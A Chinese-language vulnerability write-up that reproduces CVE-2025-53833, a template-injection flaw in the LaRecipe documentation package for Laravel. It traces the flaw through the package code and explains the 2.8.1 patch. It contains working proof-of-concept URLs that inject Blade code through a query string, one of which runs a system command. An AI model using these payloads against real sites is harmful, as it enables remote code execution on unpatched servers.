---
title: larecipe-CVE-2025-53833
tags:
  - PHP
  - 代码审计
  - CVE
date: 2025-09-04
---
larecipe CVE-2025-53833 一个cvss满分的cve。
我这里简单复现分析一下。
影响版本larecipe<=2.8.0
# 环境
```
composer create-project laravel/laravel my-docs
composer require binarytorch/larecipe==2.8.0
php artisan larecipe:install
php artisan serve --port=80
```
# poc
```
http://127.0.0.1/docs/1.0/overview?abc={{phpinfo()}}
http://127.0.0.1/docs/1.0/overview?abc={{`calc`}}
```

# 补丁
2.8.1这个修复的版本就更新了这一个地方。
my-docs\vendor\binarytorch\larecipe\src\Models

![Pasted image 20250806223820](https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/Pasted%20image%2020250806223820.png)

# 分析
## sink点
`Blade::compileString($compilableContent)`  是 Laravel ​**自带的**​ Blade 模板引擎方法 用于将 Blade 模板字符串编译为可执行的 PHP 代码。
```php
public function compileBlade($rawContent)  
{  
    $compilableContent = $this->stripCodeBlocks($rawContent);  
  
    $compiledContent = Blade::compileString($compilableContent);  
  
    return $this->mergeContent($compiledContent, $rawContent);  
}
```

```php
public function renderBlade($content, $data = [])  
{  
    $content = $this->compileBlade($content);  
.........
```

vendor/binarytorch/larecipe/src/Models/Documentation.php
```php
public function get($version, $page, $data = [])  
{  
    return $this->cache->remember(function() use($version, $page, $data) {  
        $path = base_path(config('larecipe.docs.path').'/'.$version.'/'.$page.'.md');  
  
        if ($this->files->exists($path)) {  
            $parsedContent = $this->parse($this->files->get($path));  
  
            $parsedContent = $this->replaceLinks($version, $parsedContent);  
  
            return $this->renderBlade($parsedContent, $data);  
........ 
}
```
## 追踪$parsedContent
`$parsedContent = $this->replaceLinks($version, $parsedContent);`
```php
public static function replaceLinks($version, $content)  
{  
    $content = str_replace('{{version}}', $version, $content);  
  
    $content = str_replace('{{route}}', trim(config('larecipe.docs.route'), '/'), $content);  
  
    $content = str_replace('"#', '"'.request()->getRequestUri().'#', $content);  
  
    return $content;  
}
```
此处request()->getRequestUri()获取的是完整的请求路径。
- getRequestUri 问题：
返回完整URI(包括查询字符串)，允许攻击者通过查询参数注入恶意代码。

## 修复
- getPathInfo 修复：
仅返回URI 的路径部分（如/docs/1.0/poge)、忽略查询字符串(如?test-{{malicious_code}}子），这确保用户输入的恶意代码不会嵌入$content，防止SSTI。
- 效果:
补丁有效阻断了通过URI查询字符串注入模板代码的攻击路径。

# ref
https://github.com/saleem-hadad/larecipe/
https://x.com/_r00tuser/status/1945377808550912170
https://www.weidacheng.com/2025/07/21/CVE-2025-53833 LaRecipe SSTI 模板注入漏洞/